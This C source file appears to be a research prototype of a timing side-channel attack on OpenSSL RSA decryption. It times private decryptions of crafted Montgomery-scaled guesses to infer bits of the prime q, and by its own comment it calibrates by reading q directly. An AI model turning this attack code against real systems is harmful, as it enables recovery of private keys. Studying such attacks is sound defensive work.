#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <stdio.h>
#include <string.h>
#include <openssl/bn.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <limits.h>
//#include "eea.c"

#define ITERATIONS 10
#define NEIGHBORHOOD 400

//#define DEBUG


// A compare algorithm for quicksort
int compare_long_long(const void *a, const void *b) {
    const unsigned long long *val_a = (const unsigned long long *)a;
    const unsigned long long *val_b = (const unsigned long long *)b;

    if (*val_a < *val_b) return -1;
    if (*val_a > *val_b) return 1;
    return 0;
}


void decryptTiming(RSA *rsa, BIGNUM *R, BIGNUM *Rprime, BIGNUM *guess, BIGNUM *guessneighbor, BIGNUM *cipherguess, BN_CTX *ctx, unsigned char ciphertext[], unsigned char decrypted[], unsigned long long cycles[][ITERATIONS]) {
	// Loop for timings
        int rsa_size = RSA_size(rsa);
	for (unsigned long variations = 0; variations < NEIGHBORHOOD; variations++) {
                // Create guess for the neighborhood variations
                BN_zero(guessneighbor);
                BN_set_word(guessneighbor, variations);
                BN_add(guessneighbor, guess, guessneighbor);
                BN_mod_mul(cipherguess, guessneighbor, Rprime, rsa->n, ctx);


#ifdef DEBUG
                printf("guessneighbor: ");
                BN_print_fp(stdout, guessneighbor);
                printf("\n");
#endif

                // Write cipherguess to ciphertext array (0 padded)
                memset(ciphertext, 0, (rsa_size - BN_num_bytes(cipherguess)));
		int bytes_written = BN_bn2bin(
			cipherguess, ciphertext + (rsa_size - BN_num_bytes(cipherguess)));
#ifdef DEBUG
			printf("\nCiphertext: ");
			for (int i = 0; i < rsa_size; i++) {
				printf("%02x", ciphertext[i]);
			}
			printf("\n");
#endif

		for (int i = 0; i < ITERATIONS; i++) {
			// Timing code modified from https://blog.codingconfessions.com/p/rdtsc
			unsigned int auxCPUID1, auxCPUID2;
			unsigned long long start, end;
			_mm_lfence();
			start = __rdtscp(&auxCPUID1);
			// Decrypt
			// RSA_NO_PADDING as used in the paper
			int result = RSA_private_decrypt(rsa_size, ciphertext,
							 decrypted, rsa,
							 RSA_NO_PADDING);
			_mm_lfence();
			end = __rdtscp(&auxCPUID2);

#ifdef DEBUG
			printf("\nPlaintext: ");
			for (int i = 0; i < rsa_size; i++) {
				printf("%02x ", decrypted[i]);
			}
			printf("\n");
#endif

			if (result == -1) {
				ERR_print_errors_fp(stderr);
			} else {
				cycles[variations][i] = (end - start);
#ifdef DEBUG
				printf("Decryption successful!\n");
				printf("Cycles taken: %llu\n", (end - start));
				printf("CPUIDs: %d, %d\n", auxCPUID1, auxCPUID2);
#endif
			}
		}
	}
        // Sort all results of variations and grab min, median, max, etc.
        qsort(cycles, ITERATIONS * NEIGHBORHOOD, sizeof(unsigned long long), compare_long_long);
	printf("cycles min, 10th\%tile, median, max:\n");
        printf("%llu, %llu, %llu, %llu\n", ((unsigned long long *) cycles)[0], ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/10], ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2], ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-1]);


}


int main()
{
	RSA *rsa;
	// Read the private key file
	FILE *fp = fopen("private_key.pem", "r");
	if (!fp) {
		perror("Unable to open private_key.pem");
		return 1;
	}

	// Load the private key and Instantiate rsa pointer
	rsa = PEM_read_RSAPrivateKey(fp, NULL, NULL, NULL);
	fclose(fp);

	// If rsa fails to instantiate
	if (!rsa) {
		ERR_print_errors_fp(stderr);
		return 1;
	}

        // Initialize montgomery and CTX scratchpad
	BN_CTX *ctx = BN_CTX_new();
	BN_MONT_CTX *mont = BN_MONT_CTX_new();

	// This line calculates R and the Montgomery inverse for q
	// It uses the 'ctx' as temporary workspace
	if (!BN_MONT_CTX_set(mont, rsa->q, ctx)) {
		// Handle error
	}

	// Configure values to get Montgomery R (should be 2^512 for a 1024 key)
	BIGNUM *R = BN_new();
	BIGNUM *Rprime = BN_new();
	BIGNUM *temp = BN_new();
        BN_set_bit(R, mont->ri);
	BN_mod_inverse(Rprime, R, rsa->n, ctx);
        printf("Montgomery R bits: %d\n", mont->ri);

	printf("R: ");
	BN_print_fp(stdout, R);
	printf("\n");

	printf("R^(-1): ");
	BN_print_fp(stdout, Rprime);
	printf("\n");

	BN_mod_mul(temp, R, Rprime, rsa->n, ctx);
	printf("R*R^(-1): ");
	BN_print_fp(stdout, temp);
	printf("\n");
        BN_free(temp);


	// Allocate space for input and output of decryption
	int rsa_size = RSA_size(rsa);
	printf("RSA Size is %d\n", rsa_size);
	unsigned char ciphertext[rsa_size];
	unsigned char decrypted[rsa_size];



	BIGNUM *guess = BN_new();
        BIGNUM *guessneighbor = BN_new();
        BIGNUM *cipherguess = BN_new();

        // Instantiate guess with the top hundred or so bits of q
	BN_rshift(guess, rsa->q, 381);
	BN_lshift(guess, guess, 381);




        // For storing timings
       	unsigned long long cycles[NEIGHBORHOOD][ITERATIONS] = {0};

// *********************************************************************************************
//      This is the start of actual decryption
//
//

unsigned long long lastTime[4] = {0};
unsigned long long deltaTime[4];
unsigned long long storedTimes[4][mont->ri];
int countStoredTimes = 0;

for (int i = 0; i < mont->ri; i++) {
        // Load guess directly from q (this is cheating but important for determining thresholds in prototype)
        BN_rshift(guess, rsa->q, (mont->ri-i));
        BN_lshift(guess, guess, (mont->ri-i));
        // Set the next bit to 1
        BN_set_bit(guess, mont->ri - 1 - i);

        printf("\nq:             ");
	BN_print_fp(stdout, rsa->q);
	printf("\n");

	printf("guess:         ");
	BN_print_fp(stdout, guess);
	printf("\n");

        // Run guess
        decryptTiming(rsa, R, Rprime, guess, guessneighbor, cipherguess, ctx, ciphertext, decrypted, cycles);




        // Compare timings against all previous small timings
        deltaTime[0] = ULLONG_MAX;
        deltaTime[1] = ULLONG_MAX;
        deltaTime[2] = ULLONG_MAX;
        deltaTime[3] = ULLONG_MAX;
        lastTime[0] = 0;
        lastTime[1] = 0;
        lastTime[2] = 0;
        lastTime[3] = 0;
        

        // Min Metrics
        for (int j = 0; j < countStoredTimes; j++) {
                if (storedTimes[0][j] > ((unsigned long long *) cycles)[0]) {
                        if((storedTimes[0][j] - ((unsigned long long *) cycles)[0]) < deltaTime[0]) {
                                deltaTime[0] = storedTimes[0][j] - ((unsigned long long *) cycles)[0];
                                lastTime[0] = storedTimes[0][j];
                        }
                } else {
                        if((((unsigned long long *) cycles)[0] - storedTimes[0][j]) < deltaTime[0]) {
                                deltaTime[0] = ((unsigned long long *) cycles)[0] - storedTimes[0][j];
                                lastTime[0] = storedTimes[0][j];
                        }
                }
        }

        if (lastTime[0] > ((unsigned long long *) cycles)[0]) {
                printf("+");
        } else {
                printf("-");
        }


// 10th percentile metrics
        for (int j = 0; j < countStoredTimes; j++) {
                if (storedTimes[1][j] > ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/10]) {
                        if((storedTimes[1][j] - ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/10]) < deltaTime[1]) {
                                deltaTime[1] = storedTimes[1][j] - ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/10];
                                lastTime[1] = storedTimes[1][j];
                        }
                } else {
                        if((((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/10] - storedTimes[1][j]) < deltaTime[1]) {
                                deltaTime[1] = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/10] - storedTimes[1][j];
                                lastTime[1] = storedTimes[1][j];
                        }
                }
        }

        if (lastTime[1] > ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/10]) {
                printf("+");
        } else {
                printf("-");
        }

// Median Metrics
        for (int j = 0; j < countStoredTimes; j++) {
                if (storedTimes[2][j] > ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2]) {
                        if((storedTimes[2][j] - ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2]) < deltaTime[2]) {
                                deltaTime[2] = storedTimes[2][j] - ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2];
                                lastTime[2] = storedTimes[2][j];
                        }
                } else {
                        if((((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2] - storedTimes[2][j]) < deltaTime[2]) {
                                deltaTime[2] = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2] - storedTimes[2][j];
                                lastTime[2] = storedTimes[2][j];
                        }
                }
        }

        if (lastTime[2] > ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2]) {
                printf("+");
        } else {
                printf("-");
        }

// Max Metrics
        for (int j = 0; j < countStoredTimes; j++) {
                if (storedTimes[3][j] > ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-2]) {
                        if((storedTimes[3][j] - ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-2]) < deltaTime[3]) {
                                deltaTime[3] = storedTimes[3][j] - ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-2];
                                lastTime[3] = storedTimes[3][j];
                        }
                } else {
                        if((((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-2] - storedTimes[3][j]) < deltaTime[3]) {
                                deltaTime[3] = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-2] - storedTimes[3][j];
                                lastTime[3] = storedTimes[3][j];
                        }
                }
        }

        if (lastTime[3] > ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-2]) {
                printf("+");
        } else {
                printf("-");
        }

// Print out metrics

        printf("DELTA T (");
        if (BN_cmp(guess, rsa->q) == 1) {
                printf("Big):\n");
        } else {
                printf("Small):\n");
                storedTimes[0][countStoredTimes] = ((unsigned long long *) cycles)[0];
                storedTimes[1][countStoredTimes] = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/10];
                storedTimes[2][countStoredTimes] = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2];
                storedTimes[3][countStoredTimes] = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-1];
        }     
        printf("%llu from prevTimes %llu\n", deltaTime[0], lastTime[0]);
        printf("%llu from prevTimes %llu\n", deltaTime[1], lastTime[1]);
        printf("%llu from prevTimes %llu\n", deltaTime[2], lastTime[2]);
        printf("%llu from prevTimes %llu\n", deltaTime[3], lastTime[3]);




        if (countStoredTimes > 0) {
                printf("Sequentials:\n");
                if (storedTimes[0][countStoredTimes - 1] > ((unsigned long long *) cycles)[0]) {
                        printf("+");
                        printf("%llu from prevTimes %llu\n", storedTimes[0][countStoredTimes - 1] - ((unsigned long long *) cycles)[0], storedTimes[0][countStoredTimes - 1]);
                } else {
                        printf("-");
                        printf("%llu from prevTimes %llu\n", ((unsigned long long *) cycles)[0] - storedTimes[0][countStoredTimes - 1], storedTimes[0][countStoredTimes - 1]);
                }   
                  
                if (storedTimes[1][countStoredTimes - 1] > ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/10]) {
                        printf("+");
                        printf("%llu from prevTimes %llu\n", storedTimes[1][countStoredTimes - 1] - ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/10], storedTimes[1][countStoredTimes - 1]);
                } else {
                        printf("-");
                        printf("%llu from prevTimes %llu\n", ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/10] - storedTimes[1][countStoredTimes - 1], storedTimes[1][countStoredTimes - 1]);
                }
                  
                if (storedTimes[2][countStoredTimes - 1] > ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2]) {
                        printf("+");
                        printf("%llu from prevTimes %llu\n", storedTimes[2][countStoredTimes - 1] - ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2], storedTimes[2][countStoredTimes - 1]);
                } else {
                        printf("-");
                        printf("%llu from prevTimes %llu\n", ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2] - storedTimes[2][countStoredTimes - 1], storedTimes[2][countStoredTimes - 1]);
                }
                  
                if (storedTimes[3][countStoredTimes - 1] > ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-1]) {
                        printf("+");
                        printf("%llu from prevTimes %llu\n", storedTimes[3][countStoredTimes - 1] - ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-1], storedTimes[3][countStoredTimes - 1]);
                } else {
                        printf("-");
                        printf("%llu from prevTimes %llu\n", ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-1] - storedTimes[3][countStoredTimes - 1], storedTimes[3][countStoredTimes - 1]);
                }
        }

        if (BN_cmp(guess, rsa->q) != 1) {
                countStoredTimes += 1;
        }  

        
}




	// Clean up
        BN_free(guess);
        BN_free(guessneighbor);
        BN_free(R);
        BN_free(Rprime);
        BN_free(cipherguess);

	BN_MONT_CTX_free(mont);
	BN_CTX_free(ctx);
	RSA_free(rsa);
	return 0;
}